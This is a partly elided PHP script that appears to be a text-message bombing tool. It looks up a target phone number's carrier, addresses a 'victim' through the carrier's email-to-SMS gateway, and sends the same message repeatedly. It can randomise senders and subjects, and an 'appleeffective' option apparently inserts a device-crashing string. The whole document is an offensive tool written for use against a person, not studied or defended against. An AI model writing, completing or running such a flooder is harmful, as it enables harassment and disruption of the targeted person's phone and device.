...
session_start();
$version = "1.0.0";
$password = "c35312fb3a7e05b7a44db2326bd29040"; //MD5 Hash
...
<html>
	...
	if (isset($_REQUEST['target'])) {
		...
		if (isset($_REQUEST['carrier'])) {
			...
			if ($carrier == "autodetect") {
				...
				foreach ($carriers as $carriersearch) {
					if (strpos(strtolower($apires), $carriersearch)) { $carrier = $carriersearch; break; } else { $response = "Could not detect the carrier"; }
				}
			...
			else { $result = "That carrier is invalid, fuckhead."; }
			$victim = $to . $carrier;
		} else {
			$victim = $to;
		}
		...
		if (isset($_REQUEST['message']))	{ $message = $_REQUEST['message']; } 	else { $response = "A message must be specified in your request."; }
		...
		if (!isset($response)) {
			...
			for($i = 0; $i < $num; $i++) {
				...
				if ($email_orig == "rand") { $email = rand(10000, 99999) . rand(10000, 99999); }
				if ($subject_orig == "rand") { $subject = rand(10000, 99999) . rand(10000, 99999); }
				if ($subject_orig == "appleeffective") { $subject = $appleeffective; }
				if ($message_orig == "rand") { $message = rand(10000, 99999) . rand(10000, 99999); }
				if ($message_orig == "appleeffective") { $message = $appleeffective; }
			...
			if (isset($_REQUEST['mass'])) { print $i.' messages sent.'; } else { print 'Your message was sent to '.$victim.' '.$i.' times.'; }
		} else {
			print $response;
		}
